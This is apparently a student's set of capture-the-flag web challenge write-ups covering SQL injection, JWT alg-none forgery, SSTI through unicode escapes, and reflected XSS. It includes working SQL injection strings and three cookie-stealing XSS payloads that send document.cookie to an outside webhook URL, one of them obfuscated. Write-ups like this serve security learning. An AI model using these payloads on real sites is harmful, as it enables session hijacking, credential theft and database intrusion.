# Database Incursion 2.0
### The challenge asks us to log in to a website without the password using sql injections


## My Solve
**Flag:** CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
First Tested for sql injection by entering 
```
admin' OR 1=1;--
```
 then i saw a note which said 'someone
from management has the password' so i entered the payload
```
' OR Department="Management";-- 
```
which showed
david's profile which said 'Talk to kiwi she has the password' then i entered
```
' OR (Department="Management" AND Name="Kiwi");--
```
which gave the password ecSKsN7SES. After logging in the application showed several database tables. 
After checking them individually i noticed that each table seemed to follow a four-column structure
then i entered the command 
```
' UNION SELECT name, type, sql, NULL FROM sqlite_master--
```
which revealed a table citadel_archive2077 along with the command 
CREATE TABLE CITADEL_ARCHIVE_2077 ( secrets TEXT )
then i got the flag using 
```
' UNION SELECT secrets, NULL, NULL, NULL FROM "CITADEL_ARCHIVE_2077"--
```


## What I Learned
Learned about sql injections 

## References
https://portswigger.net/web-security/sql-injection/what-is-sql-injection-sqli
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md


# Temporal Token
### The challenge asks us to find the flag by manipulating the jwt token


## My Solve
**Flag:** nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
I checked the cookies in the inspect element and saw that it was a jwt because it had a 
3 part strcture then in burp i found a request to /api/flag that used this token. Decoded the 
jwt on jwt.io and saw the issue was the exp value was 0 meaning the token was always expired so i 
edited the payload and set the exp to a future timestamp and also changed the header's algorithm to 
none so the server wudnt bother to verify the signature. After base64-encoding the modified 
header and payload, I replaced the original cookie with this new token so i got the flag


## What I Learned
Learnt about jwt token

## References
https://portswigger.net/web-security/jwt


# Oneshot
### The challenge asks us to find the flag by guessing the password of the different levels of the website


## My Solve
**Flag:** nite{are_you_feeling_the_heat_now :)}

first i tried the usual sql injection tricks to bypass the filter but none of them worked. the challenge was tricky because the site creates a new password and even a new table every time a new session starts so i only had one shot per session to get the flag. when i looked at the source code i saw that the flag is only returned if my query gives at least one row otherwise it just says i failed. the code also showed that the id only needs the first 16 characters to be valid hex so after those 16 chars i could add my own sql payload and the program would still treat the id as valid. the input was being directly added into the query as a string so i added WHERE 1=1 UNION SELECT ? -- after the real id value. this forces the query to always return a row since 1=1 is always true and union select gives it something to return. because of that condition i got the flag

## What I Learned
learned about sql injection using partial id validation and union based query manipulation.

## References
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master


# Sweethaven
### challenge asks us to exploit the servers unicode escape handling to turn a review into an ssti that gives the flag


## My Solve
i logged in by clicking register here and just entering any random credentials. this took me to a review submission page. after checking the app.py code i noticed that the server decodes escape sequences using bytes(review "utf-8").decode("unicode_escape"). because of that i replaced the normal dollar sign with \N{DOLLAR SIGN} and tested an injection like \N{DOLLAR SIGN}{7*7}. it evaluated the expression and added 49 as the review so i knew ssti was possible. then i used a known ssti payload ${cycler.init.globals.os.environ} but again replaced the dollar sign with \N{DOLLAR SIGN}. this gave me useful environment info. after that i repeated the same trick on the actual challenge site and got the flag.
**Flag:** nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}



## What I Learned
Learnt about server side template injection

## References
None


# Why its not called css
### The challenge asks us to perform reflected xss on a series of pages to steal cookies from the bot and use them to access protected parts of the site.


## My Solve
**Flag:** nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
first i read up a bit on what xss actually is and understood that its about injecting malicious code into a websites input or link so that an attacker can steal sensitive info when a victim opens it.

i used the web panel from the challenge which gives payloads for stealing cookies from the bot. i pasted the given payload into xss me 1 and submitted it. the bot visited my payload url and i received a cookie value like c=xss2=/bf2a73106a3aa48bab9b8b47e4bd350e. i took the end part of that value and appended it to the challenge sites url which unlocked the next stage.

in xss me 2 i repeated the same process with the next payload and got another cookie c=xss3=/3e79c8a64bd10f5fa897b7832384f043. again i added the last part to the challenge url to move forward.

in xss me 3 i entered the final payload and completed the chain to finish the challenge.

```
<script>window.location='https://webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+document.cookie</script>
<script>window.location='	https://webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+document.cookie</script>
<body onload="window.location='//webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+window['doc'+'ument']['coo'+'kie']">

```

## What I Learned
XSS Exploitation 

## References
None



















